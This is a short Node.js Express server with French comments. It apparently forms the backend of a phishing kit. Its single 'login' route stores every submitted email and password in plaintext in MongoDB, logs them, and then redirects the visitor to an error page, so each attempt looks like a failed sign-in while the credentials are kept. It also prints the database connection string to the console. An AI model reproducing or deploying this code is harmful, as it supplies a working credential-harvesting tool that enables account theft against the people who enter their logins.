const express = require('express');
const path = require('path');
const cors = require('cors');
const axios = require('axios');
const mongoose = require("mongoose");
const bodyParser = require('body-parser');


const app = express();
const port = process.env.PORT || 3000;
const mongodb_uri = process.env.mongodb_uri;

const User = require('./model/users');

//Configuration de l'environnement
const { log } = require('console');
require('dotenv').config();

// Utilisation du middleware CORS
app.use(cors());

// Middleware pour analyser les requêtes JSON
app.use(express.json());

// Middleware pour analyser les données de formulaire
app.use(express.urlencoded({ extended: true }));
// Middleware pour analyser les requêtes
app.use(bodyParser.urlencoded({ extended: true }));

// Route to serve your HTML page
app.use(express.static(path.join(__dirname, 'web')));
app.get('/', (req, res) => {
res.sendFile(path.join(__dirname, 'web', 'index.html'));
});



console.log('MongoDB URI:', process.env.mongodb_uri);
//connection a la base de donnee
mongoose.connect(process.env.mongodb_uri, {useNewUrlParser: true, useUnifiedTopology: true});
const db = mongoose.connection;
db.on('error', (Error)=>console.log(Error));
db.once('open',()=> console.log("connecter a la base de donnee avec sucsses"));


app.listen(port, () => {
console.log("Server running at http://localhost:3000");
});

//*******************************API CONNEXION*******************************************/

app.post('/api/users/login', async (req, res) => {
    
    const { email, password } = req.body;

    try {
        // Créer une nouvelle instance du modèle User
        const newUser = new User({
            email: email,
            password: password
        });

        // Sauvegarder l'utilisateur dans la base de données
        const savedUser = await newUser.save();
        console.log('Utilisateur inséré avec succès :', savedUser);
        // res.status(201).send('Utilisateur enregistré avec succès');
        res.redirect("/error.html")
    } catch (error) {
        console.error('Erreur lors de l\'insertion de l\'utilisateur :', error);
        res.status(500).send('Erreur lors de l\'enregistrement de l\'utilisateur');
    }
});
//**********************************************************************************************************/

